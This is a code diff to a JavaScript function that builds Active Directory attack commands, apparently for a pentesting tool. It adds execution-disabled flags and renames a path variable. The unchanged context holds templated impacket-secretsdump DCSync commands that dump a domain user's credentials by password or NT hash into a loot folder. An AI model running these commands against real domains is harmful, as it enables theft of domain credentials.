@@ -43,6 +43,9 @@ export function buildAclCommands(variables = {}) {
       key: "acl-invalid-right",
       label: "Choose a supported Impacket ACL right",
       value: "printf '%s\\n' 'ACL rights must be one of: All, ResetPassword, WriteMembers, DCSync' >&2; false",
+      executionEnabled: false,
+      instructional: true,
+      disabledReason: "Choose a supported ACL right before rendering this workflow.",
     }];
   }
 
@@ -57,6 +60,9 @@ export function buildAclCommands(variables = {}) {
       key: "acl-invalid-dcsync-target",
       label: "Set the DCSync ACL target to the domain object",
       value: `printf '%s\\n' ${shellQuote(`DCSync must be granted on the domain object. Set ACL TARGET to ${variables.domain || variables.baseDn}, not ${target}.`)} >&2; false`,
+      executionEnabled: false,
+      instructional: true,
+      disabledReason: "Set the DCSync ACL target to the confirmed domain object before rendering this workflow.",
     }];
   }
 
@@ -66,7 +72,7 @@ export function buildAclCommands(variables = {}) {
   const dcArg = `-dc-ip ${shellQuote(variableValue(variables, "rhost"))}`;
   const rightArg = impacketRights.get(right);
   const slug = right.toLowerCase();
-  const daclDir = "{{workspaceRoot}}/{{targetName}}/loot/dacl";
+  const daclDir = "{{workspaceRoot}}/{{targetSlug}}/loot/dacl";
   const beforePath = `${daclDir}/${slug}-before.txt`;
   const afterPath = `${daclDir}/${slug}-after.txt`;
   const latestBackup = `${daclDir}/${slug}-latest-backup.txt`;
@@ -130,12 +136,12 @@ export function buildAclCommands(variables = {}) {
         {
           key: "acl-dcsync-impacket-password",
           label: `Impacket DCSync with ${principal}'s password`,
-          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -just-dc-user '{{dcsyncUser}}' -dc-ip '{{rhost}}' '{{domain}}/{{user}}:{{password}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
+          value: "mkdir -p '{{workspaceRoot}}/{{targetSlug}}/loot/dcsync'; impacket-secretsdump -just-dc-user '{{dcsyncUser}}' -dc-ip '{{rhost}}' '{{domain}}/{{user}}:{{password}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetSlug}}/loot/dcsync/{{dcsyncUser}}.txt'",
         },
         {
           key: "acl-dcsync-impacket-hash",
           label: `Impacket DCSync with ${principal}'s NT hash`,
-          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -hashes ':{{hash}}' -just-dc-user '{{dcsyncUser}}' -dc-ip '{{rhost}}' '{{domain}}/{{user}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
+          value: "mkdir -p '{{workspaceRoot}}/{{targetSlug}}/loot/dcsync'; impacket-secretsdump -hashes ':{{hash}}' -just-dc-user '{{dcsyncUser}}' -dc-ip '{{rhost}}' '{{domain}}/{{user}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetSlug}}/loot/dcsync/{{dcsyncUser}}.txt'",
         },
       );
     }
